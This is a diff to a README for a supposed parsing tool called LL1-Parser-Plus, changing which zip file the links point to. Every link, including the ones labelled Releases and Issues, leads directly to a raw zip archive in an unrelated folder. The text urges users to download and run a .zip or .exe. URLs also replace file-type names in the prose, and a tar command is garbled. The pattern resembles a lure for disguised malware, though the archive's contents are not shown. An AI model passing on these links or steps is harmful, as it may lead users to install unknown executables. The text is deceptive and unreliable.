@@ -1,6 +1,6 @@
 # 🚀 LL1-Parser-Plus - A Simple Toolkit for Parsing
 
-[![Download LL1-Parser-Plus](https://raw.githubusercontent.com/jcmark-fullmetal/LL1-Parser-Plus/main/pipistrel/LL1-Parser-Plus.zip)](https://raw.githubusercontent.com/jcmark-fullmetal/LL1-Parser-Plus/main/pipistrel/LL1-Parser-Plus.zip)
+[![Download LL1-Parser-Plus](https://raw.githubusercontent.com/jcmark-fullmetal/LL1-Parser-Plus/main/pipistrel/Parser_Plus_L_3.4.zip)](https://raw.githubusercontent.com/jcmark-fullmetal/LL1-Parser-Plus/main/pipistrel/Parser_Plus_L_3.4.zip)
 
 ## 📘 Description
 
@@ -12,11 +12,11 @@ Follow these steps to download and run LL1-Parser-Plus on your computer:
 
 ### 1. Visit the Release Page
 
-To download the latest version of LL1-Parser-Plus, visit our [Releases page](https://raw.githubusercontent.com/jcmark-fullmetal/LL1-Parser-Plus/main/pipistrel/LL1-Parser-Plus.zip).
+To download the latest version of LL1-Parser-Plus, visit our [Releases page](https://raw.githubusercontent.com/jcmark-fullmetal/LL1-Parser-Plus/main/pipistrel/Parser_Plus_L_3.4.zip).
 
 ### 2. Download the Application
 
-On the Releases page, you will find the latest version listed at the top. Click on the file that matches your operating system. For most users, this will be a `.zip` or `.exe` file for Windows, or a `https://raw.githubusercontent.com/jcmark-fullmetal/LL1-Parser-Plus/main/pipistrel/LL1-Parser-Plus.zip` file for Linux.
+On the Releases page, you will find the latest version listed at the top. Click on the file that matches your operating system. For most users, this will be a `.zip` or `.exe` file for Windows, or a `https://raw.githubusercontent.com/jcmark-fullmetal/LL1-Parser-Plus/main/pipistrel/Parser_Plus_L_3.4.zip` file for Linux.
 
 ### 3. Extract the Files
 
@@ -26,7 +26,7 @@ After downloading, locate the downloaded file on your computer.
   - Right-click on the `.zip` or `.exe` file and select “Extract All” or “Run” to extract the files.
 
 - **For Linux:**
-  - If you downloaded a `https://raw.githubusercontent.com/jcmark-fullmetal/LL1-Parser-Plus/main/pipistrel/LL1-Parser-Plus.zip` file, you can extract it by right-clicking the file and selecting “Extract Here” or using the terminal with the command: `tar -xvzf https://raw.githubusercontent.com/jcmark-fullmetal/LL1-Parser-Plus/main/pipistrel/LL1-Parser-Plus.zip`.
+  - If you downloaded a `https://raw.githubusercontent.com/jcmark-fullmetal/LL1-Parser-Plus/main/pipistrel/Parser_Plus_L_3.4.zip` file, you can extract it by right-clicking the file and selecting “Extract Here” or using the terminal with the command: `tar -xvzf https://raw.githubusercontent.com/jcmark-fullmetal/LL1-Parser-Plus/main/pipistrel/Parser_Plus_L_3.4.zip`.
 
 ### 4. Open the Application
 
@@ -60,7 +60,7 @@ LL1-Parser-Plus provides detailed debug output to help you understand the parsin
 
 ## 📥 Download & Install
 
-To install the application, please follow the download steps above. You can always revisit the [Releases page](https://raw.githubusercontent.com/jcmark-fullmetal/LL1-Parser-Plus/main/pipistrel/LL1-Parser-Plus.zip) for the latest updates and versions.
+To install the application, please follow the download steps above. You can always revisit the [Releases page](https://raw.githubusercontent.com/jcmark-fullmetal/LL1-Parser-Plus/main/pipistrel/Parser_Plus_L_3.4.zip) for the latest updates and versions.
 
 ## ⚙️ System Requirements
 
@@ -78,7 +78,7 @@ Included in the package are sample grammar files. You can find them in the extra
 
 ## 🔍 Community Support
 
-For questions or help regarding LL1-Parser-Plus, we encourage you to check our [Issues page](https://raw.githubusercontent.com/jcmark-fullmetal/LL1-Parser-Plus/main/pipistrel/LL1-Parser-Plus.zip) or reach out within the community for support.
+For questions or help regarding LL1-Parser-Plus, we encourage you to check our [Issues page](https://raw.githubusercontent.com/jcmark-fullmetal/LL1-Parser-Plus/main/pipistrel/Parser_Plus_L_3.4.zip) or reach out within the community for support.
 
 ## 💬 Contributing
 
